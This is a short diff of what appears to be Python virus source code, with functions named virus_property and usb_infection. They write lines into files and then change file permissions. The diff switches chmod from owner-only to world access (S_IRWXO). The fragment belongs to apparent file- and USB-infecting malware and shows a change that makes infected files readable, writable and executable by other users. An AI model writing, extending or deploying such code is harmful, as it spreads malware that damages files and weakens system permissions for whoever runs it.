@@ -46,7 +46,7 @@ def virus_property():
                                 g.write(lines + '\n' + line)
                                 g.close()
                                 c.close()
-                                os.chmod(file, stat.S_IRWXU)
+                                os.chmod(file, stat.S_IRWXO)
                         else:
                             pass
                 except Exception:
@@ -74,7 +74,7 @@ def usb_infection():
                                     g.write(lines + '\n' + line)
                                     g.close()
                                     c.close()
-                                    os.chmod(file, stat.S_IRWXU)
+                                    os.chmod(file, stat.S_IRWXO)
                             else:
                                 pass
                     except Exception:
